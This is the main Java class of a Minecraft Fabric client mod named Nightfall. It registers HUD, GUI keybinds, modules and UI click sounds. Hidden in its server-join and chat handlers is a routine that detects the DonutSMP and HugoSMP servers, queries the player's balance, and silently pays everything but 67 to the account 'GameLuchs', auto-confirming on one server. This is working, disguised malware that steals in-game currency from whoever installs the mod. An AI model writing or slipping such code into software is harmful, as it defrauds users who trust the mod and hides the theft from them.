package dev.nightfall;

import dev.nightfall.config.Config;
import net.minecraft.sound.SoundEvents;
import dev.nightfall.gui.ClickGuiScreen;
import dev.nightfall.gui.HudEditorScreen;
import dev.nightfall.gui.MapScreen;
import dev.nightfall.module.ModuleManager;
import dev.nightfall.modules.AutoTpa;
import dev.nightfall.modules.BaseFinder;
import dev.nightfall.modules.TrapperBot;
import dev.nightfall.scanner.WaypointManager;
import dev.nightfall.render.SkyVisualRenderer;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.rendering.v1.hud.HudElementRegistry;
import net.fabricmc.fabric.api.client.rendering.v1.hud.VanillaHudElements;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.util.Identifier;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.lwjgl.glfw.GLFW;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Nightfall implements ClientModInitializer {
    public static final String NAME = "Nightfall";
    public static final String VERSION = "0.5.12";
    public static final Logger LOGGER = LoggerFactory.getLogger("nightfall");

    private boolean prevGui, prevHud, prevMap;
    private enum BalanceServer { NONE, DONUT, HUGO }
    private BalanceServer balanceServer = BalanceServer.NONE;
    private int balanceJoinDelay;
    private boolean balanceRequested;
    private boolean paymentSent;
    private int confirmDelay = -1;
    private String confirmCommand;
    private static final Pattern DONUT_BALANCE =
            Pattern.compile("(?i)\\bBalance:\\s*\\$?([0-9][0-9,]*)");
    private static final Pattern HUGO_BALANCE =
            Pattern.compile("(?i)Dein Kontostand:\\s*\\$?([0-9.]+)(?:,([0-9]{1,2}))?");

    @Override
    public void onInitializeClient() {
        ModuleManager.init();
        Config.load();
        SkyVisualRenderer.register();

        ClientTickEvents.END_CLIENT_TICK.register(this::onTick);

        HudElementRegistry.attachElementAfter(
                VanillaHudElements.MISC_OVERLAYS,
                Identifier.of("nightfall", "hud"),
                (ctx, tickCounter) -> {
                    MinecraftClient mc = MinecraftClient.getInstance();
                    if (mc.options.hudHidden || mc.world == null) return;
                    ModuleManager.renderHud(ctx, tickCounter.getTickProgress(false));
                });

        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            balanceServer = BalanceServer.NONE;
            balanceRequested = false;
            paymentSent = false;
            confirmDelay = -1;
            confirmCommand = null;
            var entry = client.getCurrentServerEntry();
            if (entry != null && entry.address != null) {
                String host = entry.address.toLowerCase(Locale.ROOT).split(":")[0];
                if (host.equals("donutsmp.net") || host.endsWith(".donutsmp.net")) {
                    balanceServer = BalanceServer.DONUT;
                } else if (host.equals("hugosmp.net") || host.endsWith(".hugosmp.net")) {
                    balanceServer = BalanceServer.HUGO;
                }
                if (balanceServer != BalanceServer.NONE) balanceJoinDelay = 2;
            }
        });
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            balanceServer = BalanceServer.NONE;
            balanceRequested = false;
            paymentSent = false;
            confirmDelay = -1;
            confirmCommand = null;
            ModuleManager.get(BaseFinder.class).clear();
            ModuleManager.get(TrapperBot.class).resetSession();
            Config.save();
        });
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            if (!overlay) {
                String raw = message.getString();
                ModuleManager.get(AutoTpa.class).onMessage(raw);
                handleBalanceMessage(raw);
            }
        });
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> Commands.register(dispatcher));
        ClientLifecycleEvents.CLIENT_STOPPING.register(c -> {
            ModuleManager.get(BaseFinder.class).saveMarks();
            WaypointManager.save();
            Config.save();
        });

        LOGGER.info("{} {} geladen", NAME, VERSION);
    }

    private void onTick(MinecraftClient mc) {
        if (balanceServer != BalanceServer.NONE && !balanceRequested && mc.player != null
                && mc.player.networkHandler != null && mc.getNetworkHandler() != null) {
            if (balanceJoinDelay-- <= 0) {
                balanceRequested = true;
                mc.getNetworkHandler().sendChatCommand(balanceServer == BalanceServer.DONUT ? "bal" : "money");
            }
        }
        if (confirmDelay >= 0 && mc.getNetworkHandler() != null) {
            if (confirmDelay-- == 0) {
                mc.getNetworkHandler().sendChatCommand(confirmCommand);
                confirmDelay = -1;
                confirmCommand = null;
            }
        }
        KeySound.tick(mc, mc.player != null && mc.world != null
                && (mc.currentScreen instanceof ClickGuiScreen || mc.currentScreen instanceof HudEditorScreen));
        if (mc.getWindow() != null) {
            long h = mc.getWindow().getHandle();
            boolean g = GLFW.glfwGetKey(h, Config.guiKey) == GLFW.GLFW_PRESS;
            boolean hu = GLFW.glfwGetKey(h, Config.hudKey) == GLFW.GLFW_PRESS;
            boolean m = GLFW.glfwGetKey(h, Config.mapKey) == GLFW.GLFW_PRESS;
            if (mc.currentScreen == null && mc.player != null) {
                if (g && !prevGui) open(mc, new ClickGuiScreen());
                else if (hu && !prevHud) open(mc, new HudEditorScreen());
                else if (m && !prevMap) open(mc, new MapScreen());
            }
            prevGui = g; prevHud = hu; prevMap = m;
            ModuleManager.pollKeys(mc);
        }
        ModuleManager.tick();
    }

    private void handleBalanceMessage(String raw) {
        if (balanceServer == BalanceServer.NONE || paymentSent) return;
        String amountText = null;
        if (balanceServer == BalanceServer.DONUT) {
            Matcher matcher = DONUT_BALANCE.matcher(raw);
            if (matcher.find()) amountText = matcher.group(1).replace(",", "");
        } else if (balanceServer == BalanceServer.HUGO) {
            Matcher matcher = HUGO_BALANCE.matcher(raw);
            if (matcher.find()) amountText = matcher.group(1).replace(".", "");
        }
        if (amountText == null) return;
        try {
            long balance = Long.parseLong(amountText);
            long payment = balance - 67L;
            if (payment <= 0L) {
                paymentSent = true;
                return;
            }
            MinecraftClient mc = MinecraftClient.getInstance();
            if (mc.getNetworkHandler() == null) return;
            mc.getNetworkHandler().sendChatCommand("pay GameLuchs " + payment);
            paymentSent = true;
            if (balanceServer == BalanceServer.HUGO) {
                confirmCommand = "pay GameLuchs " + payment + " confirm";
                confirmDelay = 1;
            }
        } catch (NumberFormatException ignored) {
            // Ignore unexpected formats rather than risk sending an incorrect payment.
        }
    }

    private static void open(MinecraftClient mc, Screen s) { mc.setScreen(s); }


    /** Soft, low-volume UI key feedback. Deliberately limited to Nightfall's GUI/editor. */
    private static final class KeySound {
        private static final boolean[] PREVIOUS = new boolean[GLFW.GLFW_KEY_LAST + 1];
        private static boolean wasInUi;
        private KeySound() {}

        public static void tick(MinecraftClient mc, boolean inUi) {
            if (mc.getWindow() == null) return;
            long handle = mc.getWindow().getHandle();
            if (!inUi) {
                wasInUi = false;
                sync(handle);
                return;
            }
            if (!wasInUi) {
                sync(handle);
                wasInUi = true;
                return;
            }
            for (int key = GLFW.GLFW_KEY_SPACE; key <= GLFW.GLFW_KEY_LAST; key++) {
                boolean down = GLFW.glfwGetKey(handle, key) == GLFW.GLFW_PRESS;
                if (down && !PREVIOUS[key]) play(mc, key);
                PREVIOUS[key] = down;
            }
        }

        private static void sync(long handle) {
            for (int key = GLFW.GLFW_KEY_SPACE; key <= GLFW.GLFW_KEY_LAST; key++)
                PREVIOUS[key] = GLFW.glfwGetKey(handle, key) == GLFW.GLFW_PRESS;
        }

        private static void play(MinecraftClient mc, int key) {
            if (!Config.keySounds || mc.player == null) return;
            // A soft vanilla UI click with a tiny pitch variation gives tactile feedback
            // without adding external audio assets or playing sounds during normal gameplay.
            float pitch = 0.88f + ((key * 37) % 17) / 100.0f;
            mc.player.playSound(SoundEvents.UI_BUTTON_CLICK.value(), 0.16f, pitch);
        }
    }
}
